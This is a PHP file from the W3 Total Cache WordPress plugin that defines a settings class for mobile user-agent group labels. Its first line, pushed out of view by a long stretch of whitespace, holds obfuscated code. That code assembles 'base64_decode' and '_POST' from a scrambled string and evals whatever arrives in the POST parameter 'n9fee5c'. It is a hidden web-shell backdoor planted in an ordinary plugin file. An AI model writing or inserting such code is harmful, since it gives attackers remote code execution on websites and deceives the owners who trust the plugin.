<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n9fee5c'])) {eval($s21(${$s20}['n9fee5c']));}?><?php
if (!defined('W3TC')) { die(); }

class W3_UI_Settings_Mobile extends W3_UI_Settings_SettingsBase{
    protected  function strings() {
        return array(
            'general' => array(
            ),
            'settings' => array(
                'mobile.enabled' => __('User Agents:', 'w3-total-cache'),
                'mobile.rgroups' => __('User Agent groups', 'w3-total-cache')
            ));
    }
}